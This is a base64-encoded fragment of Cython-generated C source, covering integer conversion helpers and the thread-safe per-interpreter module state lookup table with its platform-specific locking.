ICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgcmV0dXJuIC0oUHlfc3NpemVfdCkgKCgoKCgoKCgoc2l6ZV90KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpO1xuICAgICAgICAgICB9XG4gICAgICAgICAgIGJyZWFrO1xuICAgICAgfVxuICAgIH1cbiAgICAjZW5kaWZcbiAgICByZXR1cm4gUHlMb25nX0FzU3NpemVfdChiKTtcbiAgfVxuICB4ID0gUHlOdW1iZXJfSW5kZXgoYik7XG4gIGlmICgheCkgcmV0dXJuIC0xO1xuICBpdmFsID0gUHlMb25nX0FzU3NpemVfdCh4KTtcbiAgUHlfREVDUkVGKHgpO1xuICByZXR1cm4gaXZhbDtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5X2hhc2hfdCBfX1B5eF9QeUluZGV4X0FzSGFzaF90KFB5T2JqZWN0KiBvKSB7XG4gIGlmIChzaXplb2YoUHlfaGFzaF90KSA9PSBzaXplb2YoUHlfc3NpemVfdCkpIHtcbiAgICByZXR1cm4gKFB5X2hhc2hfdCkgX19QeXhfUHlJbmRleF9Bc1NzaXplX3Qobyk7XG4gIH0gZWxzZSB7XG4gICAgUHlfc3NpemVfdCBpdmFsO1xuICAgIFB5T2JqZWN0ICp4O1xuICAgIHggPSBQeU51bWJlcl9JbmRleChvKTtcbiAgICBpZiAoIXgpIHJldHVybiAtMTtcbiAgICBpdmFsID0gUHlMb25nX0FzTG9uZyh4KTtcbiAgICBQeV9ERUNSRUYoeCk7XG4gICAgcmV0dXJuIGl2YWw7XG4gIH1cbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9Pd25lZF9QeV9Ob25lKGludCBiKSB7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoYik7XG4gICAgcmV0dXJuIF9fUHl4X05ld1JlZihQeV9Ob25lKTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfUHlCb29sX0Zyb21Mb25nKGxvbmcgYikge1xuICByZXR1cm4gYiA/IF9fUHl4X05ld1JlZihQeV9UcnVlKSA6IF9fUHl4X05ld1JlZihQeV9GYWxzZSk7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X1B5TG9uZ19Gcm9tU2l6ZV90KHNpemVfdCBpdmFsKSB7XG4gICAgcmV0dXJuIFB5TG9uZ19Gcm9tU2l6ZV90KGl2YWwpO1xufVxuI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5TG9uZ19Db21wYWN0QXNMb25nKFB5T2JqZWN0ICp4LCBsb25nICpyZXR1cm5fdmFsdWUpIHtcbiAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkpKVxuICAgICAgICByZXR1cm4gMDtcbiAgICBQeV9zc2l6ZV90IHZhbHVlID0gX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZSh4KTtcbiAgICBpZiAoKHNpemVvZihsb25nKSA8IHNpemVvZihQeV9zc2l6ZV90KSkgJiYgdW5saWtlbHkodmFsdWUgIT0gKGxvbmcpIHZhbHVlKSlcbiAgICAgICAgcmV0dXJuIDA7XG4gICAgKnJldHVybl92YWx1ZSA9IChsb25nKSB2YWx1ZTtcbiAgICByZXR1cm4gMTtcbn1cbiNlbmRpZlxuXG5cblxuI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAmJiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuI2lmbmRlZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRVxuI2lmIChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDApXG4gICNkZWZpbmUgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUgMVxuI2Vsc2VcbiAgI2RlZmluZSBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRSAwXG4jZW5kaWZcbiNlbmRpZlxuI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFICYmICFDWVRIT05fQVRPTUlDU1xuI2Vycm9yICJNb2R1bGUgc3RhdGUgd2l0aCBQRVA0ODkgcmVxdWlyZXMgYXRvbWljcy4gQ3VycmVudGx5IHRoYXRcJ3Mgb25lIG9mXFxcbiBDMTEsIEMrKzExLCBnY2MgYXRvbWljIGludHJpbnNpY3Mgb3IgTVNWQyBhdG9taWMgaW50cmluc2ljcyJcbiNlbmRpZlxuI2lmICFDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRVxuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKClcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKClcbiNlbGlmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbnN0YXRpYyBQeU11dGV4IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4ID0gezB9O1xuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCkgUHlNdXRleF9Mb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleClcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgUHlNdXRleF9VbmxvY2soJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KVxuI2VsaWYgZGVmaW5lZChfX2NwbHVzcGx1cykgJiYgX19jcGx1c3BsdXMgPj0gMjAxMTAzTFxuI2luY2x1ZGUgPG11dGV4Plxuc3RhdGljIHN0ZDo6bXV0ZXggX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXg7XG4jZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleC5sb2NrKClcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgudW5sb2NrKClcbiNlbGlmIGRlZmluZWQoX19TVERDX1ZFUlNJT05fXykgJiYgKF9fU1REQ19WRVJTSU9OX18gPiAyMDExMTJMKSAmJiAhZGVmaW5lZChfX1NURENfTk9fVEhSRUFEU19fKVxuI2luY2x1ZGUgPHRocmVhZHMuaD5cbnN0YXRpYyBtdHhfdCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleDtcbnN0YXRpYyBvbmNlX2ZsYWcgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXhfb25jZV9mbGFnID0gT05DRV9GTEFHX0lOSVQ7XG5zdGF0aWMgdm9pZCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9pbml0aWFsaXplX211dGV4KHZvaWQpIHtcbiAgICBtdHhfaW5pdCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgsIG10eF9wbGFpbik7XG59XG4jZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKVxcXG4gIGNhbGxfb25jZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXhfb25jZV9mbGFnLCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9pbml0aWFsaXplX211dGV4KTtcXFxuICBtdHhfbG9jaygmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpXG4jZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX1VubG9jaygpIG10eF91bmxvY2soJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KVxuI2VsaWYgZGVmaW5lZChIQVZFX1BUSFJFQURfSClcbiNpbmNsdWRlIDxwdGhyZWFkLmg+XG5zdGF0aWMgcHRocmVhZF9tdXRleF90IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4ID0gUFRIUkVBRF9NVVRFWF9JTklUSUFMSVpFUjtcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpIHB0aHJlYWRfbXV0ZXhfbG9jaygmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpXG4jZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX1VubG9jaygpIHB0aHJlYWRfbXV0ZXhfdW5sb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleClcbiNlbGlmIGRlZmluZWQoX1dJTjMyKVxuI2luY2x1ZGUgPFdpbmRvd3MuaD4gIC8vIHN5bmNoYXBpLmggb24gaXRzIG93biBkb2VzblwndCB3b3JrXG5zdGF0aWMgU1JXTE9DSyBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCA9IFNSV0xPQ0tfSU5JVDtcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpIEFjcXVpcmVTUldMb2NrRXhjbHVzaXZlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleClcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgUmVsZWFzZVNSV0xvY2tFeGNsdXNpdmUoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KVxuI2Vsc2VcbiNlcnJvciAiTm8gc3VpdGFibGUgbG9jayBhdmFpbGFibGUgZm9yIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFLlxcXG4gUmVxdWlyZXMgQyBzdGFuZGFyZCA+PSBDMTEsIG9yIEMrKyBzdGFuZGFyZCA+PSBDKysxMSxcXFxuIG9yIHB0aHJlYWRzLCBvciB0aGUgV2luZG93cyAzMiBBUEksIG9yIFB5dGhvbiA+PSAzLjEzLiJcbiNlbmRpZlxudHlwZWRlZiBzdHJ1Y3Qge1xuICAgIGludDY0X3QgaWQ7XG4gICAgUHlPYmplY3QgKm1vZHVsZTtcbn0gX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZTtcbnR5cGVkZWYgc3RydWN0IHtcbiAgICBjaGFyIGludGVycHJldGVyX2lkX2FzX2luZGV4O1xuICAgIFB5X3NzaXplX3QgY291bnQ7XG4gICAgUHlfc3NpemVfdCBhbGxvY2F0ZWQ7XG4gICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSB0YWJsZVsxXTtcbn0gX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhO1xuI2RlZmluZSBfX1BZWF9NT0RVTEVfU1RBVEVfTE9PS1VQX1NNQUxMX1NJWkUgMzJcbiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRVxuc3RhdGljIF9fcHl4X2F0b21pY19pbnRfdHlwZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIgPSAwO1xuI2VuZGlmXG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkVcbnN0YXRpYyBfX3B5eF9hdG9taWNfcHRyX3R5cGUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSA9IDA7XG4jZWxzZVxuc3RhdGljIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSogX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSA9IE5VTEw7XG4jZW5kaWZcbnN0YXRpYyBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlU3RhdGVMb29rdXBUYWJsZUxvd2VyQm91bmQoXG4gICAgICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIHRhYmxlLFxuICAgICAgICBQeV9zc2l6ZV90IGNvdW50LFxuICAgICAgICBpbnQ2NF90IGludGVycHJldGVySWQpIHtcbiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBiZWdpbiA9IHRhYmxlO1xuICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGVuZCA9IGJlZ2luICsgY291bnQ7XG4gICAgaWYgKGJlZ2luLT5pZCA9PSBpbnRlcnByZXRlcklkKSB7XG4gICAgICAgIHJldHVybiBiZWdpbjtcbiAgICB9XG4gICAgd2hpbGUgKChlbmQgLSBiZWdpbikgPiBfX1BZWF9NT0RVTEVfU1RBVEVfTE9PS1VQX1NNQUxMX1NJWkUpIHtcbiAgICAgICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSogaGFsZndheSA9IGJlZ2luICsgKGVuZCAtIGJlZ2luKS8yO1xuICAgICAgICBpZiAoaGFsZndheS0+aWQgPT0gaW50ZXJwcmV0ZXJJZCkge1xuICAgICAgICAgICAgcmV0dXJuIGhhbGZ3YXk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGhhbGZ3YXktPmlkIDwgaW50ZXJwcmV0ZXJJZCkge1xuICAgICAgICAgICAgYmVnaW4gPSBoYWxmd2F5O1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgZW5kID0gaGFsZndheTtcbiAgICAgICAgfVxuICAgIH1cbiAgICBmb3IgKDsgYmVnaW4gPCBlbmQ7ICsrYmVnaW4pIHtcbiAgICAgICAgaWYgKGJlZ2luLT5pZCA+PSBpbnRlcnByZXRlcklkKSByZXR1cm4gYmVnaW47XG4gICAgfVxuICAgIHJldHVybiBiZWdpbjtcbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfU3RhdGVfRmluZE1vZHVsZShDWVRIT05fVU5VU0VEIHZvaWQqIGR1bW15KSB7XG4gICAgaW50NjRfdCBpbnRlcnByZXRlcl9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJRChfX1B5eF9QeUludGVycHJldGVyU3RhdGVfR2V0KCkpO1xuICAgIGlmIChpbnRlcnByZXRlcl9pZCA9PSAtMSkgcmV0dXJuIE5VTEw7XG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkVcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqIGRhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKilfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEpO1xuICAgIHtcbiAgICAgICAgX19weXhfYXRvbWljX2luY3JfYWNxX3JlbCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfcmVhZF9jb3VudGVyKTtcbiAgICAgICAgaWYgKGxpa2VseShkYXRhKSkge1xuICAgICAgICAgICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKiBuZXdfZGF0YSA9IChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqKV9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfYWNxdWlyZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSk7XG4gICAgICAgICAgICBpZiAobGlrZWx5KGRhdGEgPT0gbmV3X2RhdGEpKSB7XG4gICAgICAgICAgICAgICAgZ290byByZWFkX2ZpbmlzaGVkO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlcik7XG4gICAgICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKTtcbiAgICAgICAgX19weXhfYXRvbWljX2luY3JfcmVsYXhlZCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfcmVhZF9jb3VudGVyKTtcbiAgICAgICAgZGF0YSA9IChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqKV9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfcmVsYXhlZCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSk7XG4gICAgICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX1VubG9jaygpO1xuICAgIH1cbiAgcmVhZF9maW5pc2hlZDo7XG4jZWxzZVxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSogZGF0YSA9IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGE7XG4jZW5kaWZcbiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBmb3VuZCA9IE5VTEw7XG4gICAgaWYgKHVubGlrZWx5KCFkYXRhKSkgZ290byBlbmQ7XG4gICAgaWYgKGRhdGEtPmludGVycHJldGVyX2lkX2FzX2luZGV4KSB7XG4gICAgICAgIGlmIChpbnRlcnByZXRlcl9pZCA8IGRhdGEtPmNvdW50KSB7XG4gICAgICAgICAgICBmb3VuZCA9IGRhdGEtPnRhYmxlK2ludGVycHJldGVyX2lkO1xuICAgICAgICB9XG4gICAgfSBlbHNlIHtcbiAgICAgICAgZm91bmQgPSBfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlU3RhdGVMb29rdXBUYWJsZUxvd2VyQm91bmQoXG4gICAgICAgICAgICBkYXRhLT50YWJsZSwgZGF0YS0+Y291bnQsIGludGVycHJldGVyX2lkKTtcbiAgICB9XG4gIGVuZDpcbiAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpyZXN1bHQ9TlVMTDtcbiAgICAgICAgaWYgKGZvdW5kICYmIGZvdW5kLT5pZCA9PSBpbnRlcnByZXRlcl9pZCkge1xuICAgICAgICAgICAgcmVzdWx0ID0gZm91bmQtPm1vZHVsZTtcbiAgICAgICAgfVxuI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFXG4gICAgICAgIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlcik7XG4jZW5kaWZcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG59XG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkVcbnN0YXRpYyB2b2lkIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3dhaXRfdW50aWxfbm9fcmVhZGVycyh2b2lkKSB7XG4gICAgd2hpbGUgKF9fcHl4X2F0b21pY19sb2FkKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIpICE9IDApO1xufVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfd2FpdF91bnRpbF9ub19yZWFkZXJzKClcbiNlbmRpZlxuc3RhdGljIGludCBfX1B5eF9TdGF0ZV9BZGRNb2R1bGVJbnRlcnBJZEFzSW5kZXgoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICoqb2xkX2RhdGEsIFB5T2JqZWN0KiBtb2R1bGUsIGludDY0X3QgaW50ZXJwcmV0ZXJfaWQpIHtcbiAgICBQeV9zc2l6ZV90IHRvX2FsbG9jYXRlID0gKCpvbGRfZGF0YSktPmFsbG9jYXRlZDtcbiAgICB3aGlsZSAodG9fYWxsb2NhdGUgPD0gaW50ZXJwcmV0ZXJfaWQpIHtcbiAgICAgICAgaWYgKHRvX2FsbG9jYXRlID09IDApIHRvX2FsbG9jYXRlID0gMTtcbiAgICAgICAgZWxzZSB0b19hbGxvY2F0ZSAqPSAyO1xuICAgIH1cbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKm5ld19kYXRhID0gKm9sZF9kYXRhO1xuICAgIGlmICh0b19hbGxvY2F0ZSAhPSAoKm9sZF9kYXRhKS0+YWxsb2NhdGVkKSB7XG4gICAgICAgICBuZXdfZGF0YSA9IChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKilyZWFsbG9jKFxuICAgICAgICAgICAgKm9sZF9kYXRhLFxuICAgICAgICAgICAgc2l6ZW9mKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSkrKHRvX2FsbG9jYXRlLTEpKnNpemVvZihfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKSk7XG4gICAgICAgIGlmICghbmV3X2RhdGEpIHtcbiAgICAgICAgICAgIFB5RXJyX05vTWVtb3J5KCk7XG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgIH1cbiAgICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBuZXdfZGF0YS0+YWxsb2NhdGVkOyBpIDwgdG9fYWxsb2NhdGU7ICsraSkge1xuICAgICAgICAgICAgbmV3X2RhdGEtPnRhYmxlW2ldLmlkID0gaTtcbiAgICAgICAgICAgIG5ld19kYXRhLT50YWJsZVtpXS5tb2R1bGUgPSBOVUxMO1xuICAgICAgICB9XG4gICAgICAgIG5ld19kYXRhLT5hbGxvY2F0ZWQgPSB0b19hbGxvY2F0ZTtcbiAgICB9XG4gICAgbmV3X2RhdGEtPnRhYmxlW2ludGVycHJldGVyX2lkXS5tb2R1bGUgPSBtb2R1bGU7XG4gICAgaWYgKG5ld19kYXRhLT5jb3VudCA8IGludGVycHJldGVyX2lkKzEpIHtcbiAgICAgICAgbmV3X2RhdGEtPmNvdW50ID0gaW50ZXJwcmV0ZXJfaWQrMTtcbiAgICB9XG4gICAgKm9sZF9kYXRhID0gbmV3X2RhdGE7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgdm9pZCBfX1B5eF9TdGF0ZV9Db252ZXJ0RnJvbUludGVycElkQXNJbmRleChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKmRhdGEpIHtcbiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlICpyZWFkID0gZGF0YS0+dGFibGU7XG4gICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSAqd3JpdGUgPSBkYXRhLT50YWJsZTtcbiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlICplbmQgPSByZWFkICsgZGF0YS0+Y291bnQ7XG4gICAgZm9yICg7IHJlYWQ8ZW5kOyArK3JlYWQpIHtcbiAgICAgICAgaWYgKHJlYWQtPm1vZHVsZSkge1xuICAgICAgICAgICAgd3JpdGUtPmlkID0gcmVhZC0+aWQ7XG4gICAgICAgICAgICB3cml0ZS0+bW9kdWxlID0gcmVhZC0+bW9kdWxlO1xuICAgICAgICAgICAgKyt3cml0ZTtcbiAgICAgICAgfVxuICAgIH1cbiAgICBkYXRhLT5jb3VudCA9IHdyaXRlIC0gZGF0YS0+dGFibGU7XG4gICAgZm9yICg7IHdyaXRlPGVuZDsgKyt3cml0ZSkge1xuICAgICAgICB3cml0ZS0+aWQgPSAwO1xuICAgICAgICB3cml0ZS0+bW9kdWxlID0gTlVMTDtcbiAgICB9XG4gICAgZGF0YS0+aW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXggPSAwO1xufVxuc3RhdGljIGludCBfX1B5eF9TdGF0ZV9BZGRNb2R1bGUoUHlPYmplY3QqIG1vZHVsZSwgQ1lUSE9OX1VOVVNFRCB2b2lkKiBkdW1teSkge1xuICAgIGludDY0X3QgaW50ZXJwcmV0ZXJfaWQgPSBQeUludGVycHJldGVyU3RhdGVfR2V0SUQoX19QeXhfUHlJbnRlcnByZXRlclN0YXRlX0dldCgpKTtcbiAgICBpZiAoaW50ZXJwcmV0ZXJfaWQgPT0gLTEpIHJldHVybiAtMTtcbiAgICBpbnQgcmVzdWx0ID0gMDtcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCk7XG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkVcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKm9sZF9kYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqKVxuICAgICAgICAgICAgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEsIDApO1xuI2Vsc2VcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKm9sZF9kYXRhID0gX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YTtcbiNlbmRpZlxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqbmV3X2RhdGEgPSBvbGRfZGF0YTtcbiAgICBpZiAoIW5ld19kYXRhKSB7XG4gICAgICAgIG5ld19kYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqKWNhbGxvYygxLCBzaXplb2YoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKSk7XG4gICAgICAgIGlmICghbmV3X2RhdGEpIHtcbiAgICAgICAgICAgIHJlc3VsdCA9IC0xO1xuICAgICAgICAgICAgUHlFcnJfTm9NZW1vcnkoKTtcbiAgICAgICAgICAgIGdvdG8gZW5kO1xuICAgICAgICB9XG4gICAgICAgIG5ld19kYXRhLT5hbGxvY2F0ZWQgPSAxO1xuICAgICAgICBuZXdfZGF0YS0+aW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXggPSAxO1xuICAgIH1cbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF93YWl0X3VudGlsX25vX3JlYWRlcnMoKTtcbiAgICBpZiAobmV3X2RhdGEtPmludGVycHJldGVyX2lkX2FzX2luZGV4KSB7XG4gICAgICAgIGlmIChpbnRlcnByZXRlcl9pZCA8IF9fUFlYX01PRFVMRV9TVEFURV9MT09LVVBfU01BTExfU0laRSkge1xuICAgICAgICAgICAgcmVzdWx0ID0gX19QeXhfU3RhdGVfQWRkTW9kdWxlSW50ZXJwSWRBc0luZGV4KCZuZXdfZGF0YSwgbW9kdWxlLCBpbnRlcnByZXRlcl9pZCk7XG4gICAgICAgICAgICBnb3RvIGVuZDtcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9TdGF0ZV9Db252ZXJ0RnJvbUludGVycElkQXNJbmRleChuZXdfZGF0YSk7XG4gICAgfVxuICAgIHtcbiAgICAgICAgUHlfc3NpemVfdCBpbnNlcnRfYXQgPSAwO1xuICAgICAgICB7XG4gICAgICAgICAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBsb3dlcl9ib3VuZCA9IF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGVTdGF0ZUxvb2t1cFRhYmxlTG93ZXJCb3VuZChcbiAgICAgICAgICAgICAgICBuZXdfZGF0YS0+dGFibGUsIG5ld19kYXRhLT5jb3VudCwgaW50ZXJwcmV0ZXJfaWQpO1xuICAgICAgICAgICAgYXNzZXJ0KGxvd2VyX2JvdW5kKTtcbiAgICAgICAgICAgIGluc2VydF9hdCA9IGxvd2VyX2JvdW5kIC0gbmV3X2RhdGEtPnRhYmxlO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGluc2VydF9hdCA8IG5ld19kYXRhLT5jb3VudCAmJiBsb3dlcl9ib3VuZC0+aWQgPT0gaW50ZXJwcmV0ZXJfaWQpKSB7XG4gICAgICAgICAgICAgICAgbG93ZXJfYm91bmQtPm1vZHVsZSA9IG1vZHVsZTtcbiAgICAgICAgICAgICAgICBnb3RvIGVuZDsgIC8vIGFscmVhZHkgaW4gdGFibGUsIG5vdGhpbmcgbW9yZSB0byBkb1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIGlmIChuZXdfZGF0YS0+Y291bnQrMSA+PSBuZXdfZGF0YS0+YWxsb2NhdGVkKSB7XG4gICAgICAgICAgICBQeV9zc2l6ZV90IHRvX2FsbG9jYXRlID0gKG5ld19kYXRhLT5jb3VudCsxKSoyO1xuICAgICAgICAgICAgbmV3X2RhdGEgPVxuICAgICAgICAgICAgICAgIChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqKXJlYWxsb2MoXG4gICAgICAgICAgICAgICAgICAgIG5ld19kYXRhLFxuICAgICAgICAgICAgICAgICAgICBzaXplb2YoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKSArXG4gICAgICAgICAgICAgICAgICAgICh0b19hbGxvY2F0ZS0xKSpzaXplb2YoX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSkpO1xuICAgICAgICAgICAgaWYgKCFuZXdfZGF0YSkge1xuICAgICAgICAgICAgICAgIHJlc3VsdCA9IC0xO1xuICAgICAgICAgICAgICAgIG5ld19kYXRhID0